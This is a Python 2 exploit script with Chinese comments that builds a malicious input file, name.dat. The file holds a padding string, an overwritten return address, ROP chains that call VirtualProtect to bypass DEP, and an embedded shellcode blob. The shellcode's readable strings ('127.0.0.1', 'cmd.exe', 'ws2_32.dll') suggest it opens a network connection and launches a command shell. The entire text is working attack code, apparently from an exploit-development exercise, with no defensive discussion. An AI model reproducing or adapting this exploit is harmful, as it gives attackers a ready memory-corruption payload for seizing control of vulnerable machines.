# -*- coding: cp936 -*-
import struct

# VirtualProtect的函数原型如下:
#   BOOL WINAPI VirtualProtect(
#     _In_   LPVOID lpAddress,
#     _In_   SIZE_T dwSize,
#     _In_   DWORD flNewProtect,
#     _Out_  PDWORD lpflOldProtect
#   );

# VirtualProtectEx的函数原型如下:
#   BOOL WINAPI VirtualProtectEx(
#	  _In_	 HANDLE hProcess,	
#     _In_   LPVOID lpAddress,
#     _In_   SIZE_T dwSize,
#     _In_   DWORD flNewProtect,
#     _Out_  PDWORD lpflOldProtect
#   );

kernel32 = 0x75340000
ntdll = 0x77a60000

def create_rop_chain():
	# rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x753afcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75358ab0,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL]
      0x75383d46,  # XCHG EAX,ESI # RETN [KERNEL32.DLL] 
      0x75395d0e,  # POP EBP # RETN [KERNEL32.DLL] 
      0x75356dc7,  # & call esp [KERNEL32.DLL]
      0x77abad7c,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x77aa0b00,  # POP EDX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> edx
      0x77b5b611,  # POP ECX # RETN [ntdll.dll] 
      0x754403ed,  # &Writable location [KERNEL32.DLL]
      0x77a8869d,  # POP EDI # RETN [ntdll.dll] 
      0x77b40883,  # RETN (ROP NOP) [ntdll.dll]
      0x7536af02,  # POP EAX # RETN [KERNEL32.DLL] 
      0x90909090,  # nop
      0x77aefb99,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_rop_chain_ex():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x753afcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x753c0718,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL]
      0x7539e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x77aee7cd,  # XCHG EAX,EDI # RETN								
      0x7536af02,  # POP EAX # RETN [KERNEL32.DLL] 						
      0x75356dc7,  # & call esp [KERNEL32.DLL]
      0x77abad7c,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x77aa0b00,  # POP EDX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> edx
      0x77b5b611,  # POP ECX # RETN [ntdll.dll] 
      0x754403ed,  # &Writable location [KERNEL32.DLL]
      0x75358007,  # POP ESI # RETN 									
      0x75358008,  # RETN(hProcess & ret2shellcode)						
      0x75395d0e,  # POP EBP # RETN [KERNEL32.DLL] 			
      0x90909090,  # nop
      0x77aefb99,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def write_file(file_path):
    with open(file_path, 'wb') as f:
        ret_eip = ntdll + 0xbefb    # retn
        shellcode = (
            "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\xb1\x03\x01\x01\x81\xf1\x01\x01"
    		"\x01\x01\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
    		"\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x82\x02\x05\x05"
    		"\xb9\x03\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x55\x8b\xec\x83"
    		"\xe4\xf8\x81\xec\x2c\x02\x05\x05\x53\x56\x57\x68\x8d\x10\xb7\xf8"
    		"\xe8\xac\x01\x05\x05\xc7\x04\x24\xa0\x02\x05\x05\xff\xd0\x68\x40"
    		"\xd5\xdc\x2d\xe8\x99\x01\x05\x05\x68\x6f\xf1\xd4\x9f\x8b\xf0\xe8"
    		"\x8d\x01\x05\x05\x68\x82\xa1\x0d\xa5\x8b\xf8\xe8\x81\x01\x05\x05"
    		"\x68\x70\xbe\x1c\x23\x89\x44\x24\x38\xe8\x73\x01\x05\x05\x68\xd1"
    		"\xfe\x73\x1b\x89\x44\x24\x34\xe8\x65\x01\x05\x05\x68\xe2\xfa\x1b"
    		"\x01\xe8\x5b\x01\x05\x05\x68\xc9\x53\x29\xdc\x89\x44\x24\x48\xe8"
    		"\x4d\x01\x05\x05\x68\x6e\x85\x1c\x5c\x89\x44\x24\x34\xe8\x3f\x01"
    		"\x05\x05\x68\xe0\x53\x31\x4b\x89\x44\x24\x40\xe8\x31\x01\x05\x05"
    		"\x68\x98\x94\x8e\xca\x89\x44\x24\x40\xe8\x23\x01\x05\x05\x83\xc4"
    		"\x28\x89\x44\x24\x10\x8d\x84\x24\xa8\x05\x05\x05\x50\x68\x02\x02"
    		"\x05\x05\xff\xd6\x33\xdb\x85\xc0\x0f\x85\xd5\x05\x05\x05\x53\x53"
    		"\x53\x6a\x06\x6a\x01\x6a\x02\xff\xd7\x8b\xf0\x83\xfe\xff\x0f\x84"
    		"\xbf\x05\x05\x05\x8d\x44\x24\x24\x50\x53\x53\x68\x8e\x02\x05\x05"
    		"\xff\x54\x24\x24\x85\xc0\x0f\x85\xa7\x05\x05\x05\x6a\x02\x53\x53"
    		"\x6a\x10\x8d\x44\x24\x60\x50\x8b\x44\x24\x38\xff\x70\x10\xff\x70"
    		"\x18\xff\x54\x24\x38\x6a\x02\x58\x66\x89\x44\x24\x30\xb8\x05\x7b"
    		"\x05\x05\x66\x89\x44\x24\x32\x8d\x44\x24\x50\x50\xff\x54\x24\x30"
    		"\x53\x53\x53\x53\x89\x44\x24\x44\x6a\x10\x8d\x44\x24\x44\x50\x56"
    		"\xff\x54\x24\x44\x85\xc0\x75\x5b\x6a\x44\x59\x8b\xd1\x8d\x44\x24"
    		"\x60\x88\x18\x40\x4a\x75\xfa\x8d\x44\x24\x40\x50\x8d\x44\x24\x64"
    		"\x50\x53\x53\x53\x6a\x01\x53\x53\x68\x98\x02\x05\x05\x53\x89\x8c"
    		"\x24\x88\x05\x05\x05\xc7\x84\x24\xb4\x05\x05\x05\x05\x01\x05\x05"
    		"\x89\xb4\x24\xc8\x05\x05\x05\x89\xb4\x24\xc4\x05\x05\x05\x89\xb4"
    		"\x24\xc0\x05\x05\x05\xff\x54\x24\x48\x6a\xff\xff\x74\x24\x44\xff"
    		"\x54\x24\x18\x53\xff\x54\x24\x1c\x5f\x5e\x33\xc0\x5b\x8b\xe5\x5d"
    		"\xc3\x33\xc0\xeb\x11\xc1\xc8\x0d\x80\xf9\x61\x0f\xbe\xc9\x7c\x03"
    		"\x83\xe9\x20\x03\xc1\x42\x8a\x0a\x84\xc9\x75\xe9\xc3\x83\xc0\xf8"
    		"\xc3\x55\x8b\xec\x83\xec\x10\x64\xa1\x30\x05\x05\x05\x89\x45\xfc"
    		"\x8b\x45\xfc\x8b\x40\x0c\x8b\x48\x14\x53\x56\x89\x4d\xf0\x57\x8b"
    		"\xc1\xe8\xd7\xff\xff\xff\x8b\x78\x18\x8b\x09\x89\x4d\xf8\x85\xff"
    		"\x74\x49\x8b\x47\x3c\x8b\x74\x38\x78\x85\xf6\x74\x3e\x03\xf7\x8b"
    		"\x56\x0c\x03\xd7\xe8\x98\xff\xff\xff\x8b\x5e\x20\x83\x65\xfc\x05"
    		"\x03\xdf\x83\x7e\x18\x05\x89\x45\xf4\x76\x20\x8b\x45\xfc\x8b\x14"
    		"\x83\x03\xd7\xe8\x79\xff\xff\xff\x03\x45\xf4\x39\x45\x08\x74\x18"
    		"\xff\x45\xfc\x8b\x45\xfc\x3b\x46\x18\x72\xe0\x8b\x45\xf0\x39\x45"
    		"\xf8\x74\x1f\x8b\x4d\xf8\xeb\x97\x8b\x4d\xfc\x8b\x46\x24\x8d\x04"
    		"\x48\x0f\xb7\x04\x38\x8b\x4e\x1c\x8d\x04\x81\x8b\x04\x38\x03\xc7"
    		"\xeb\x02\x33\xc0\x5f\x5e\x5b\xc9\xc3\x31\x05\x05\x05\xf5\x05\x05"
    		"\x05\x72\x01\x05\x05\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x05\x63"
    		"\x6d\x64\x2e\x65\x78\x65\x05\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c"
    		"\x6c\x05")
        name = 'a'*36 + struct.pack('<I', ret_eip) + create_rop_chain() + shellcode
        f.write(name)

write_file(r'name.dat')
